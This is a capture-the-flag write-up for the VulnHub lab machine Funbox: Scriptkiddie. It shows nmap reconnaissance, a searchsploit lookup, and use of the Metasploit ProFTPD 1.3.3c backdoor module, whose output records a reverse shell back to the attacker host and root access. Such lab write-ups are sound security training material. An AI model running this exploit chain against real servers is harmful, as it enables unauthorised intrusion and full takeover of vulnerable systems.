# 🔐 Funbox: Scriptkiddie Write Up

### **Description** VulnHub machine, exploiting a known ProFTPD backdoor to gain root
Difficulty: Easy

### Phase 1: Reconnaissance

## Getting the target machine IP address, I used arp-scan in local network

```bash
sudo arp-scan -l
```

> target ip: 192.168.100.8

## Scanning the target ip using nmap

```bash

┌──(kali㉿kali)-[~/Desktop/Funbox11]
└─$ nmap -sV 192.168.100.8 -o nmap_funbox_scan
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-12 00:12 -0400
Nmap scan report for 192.168.100.8
Host is up (0.0082s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.3c
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:02:F5:62 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  funbox11, FUNBOX11; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds

```

A lot of ports open here, FTP, SSH, SMTP, HTTP, POP3, Samba and IMAP. Port 21 immediately stands out, it's running ProFTPD 1.3.3c, a version with a well known backdoor.

Checked port 80 in the browser just to confirm the box, it resolves to `funbox11` and shows the Funbox: Scriptkiddie landing page:

![homepage](screenshots/homepage.png)

### Phase 2: Exploitation

## Checking the FTP version for known exploits

```bash
┌──(kali㉿kali)-[~/Desktop/Funbox11]
└─$ searchsploit ProFTPD 1.3.3c
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                             | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                       | linux/remote/16921.rb
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

ProFTPD 1.3.3c ships with a known compromised source backdoor, so instead of the manual PoC I used the Metasploit module that wraps it: `unix/ftp/proftpd_133c_backdoor`.

```
msf exploit(unix/ftp/proftpd_133c_backdoor) > exploit
[*] Started reverse TCP double handler on 192.168.100.4:4444
[*] 192.168.100.8:21 - Sending Backdoor Command
[*] Accepted the first client connection ...
[*] Accepted the second client connection ...
[*] Command: echo JjQkCzPVnapaAjMd;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets ...
[*] Reading from socket B
[*] B: "JjQkCzPVnapaAjMd\r\n"
[*] Matching ...
[*] A is input ...
[*] Command shell session 1 opened (192.168.100.4:4444 → 192.168.100.8:45208)
```

Session opened straight away, and it came back as a root shell, no privilege escalation needed on this box:

![exploit](screenshots/exploit.png)

### Phase 3: Flag

## Grabbing root.txt

```bash
cd /root
ls
root.txt
cat root.txt
```

```
Please, tweet this to: @0815R2d2
Thank you ...
```

![flag](screenshots/flag.png)

Root obtained straight through the ProFTPD backdoor, no privilege escalation chain required for this machine.
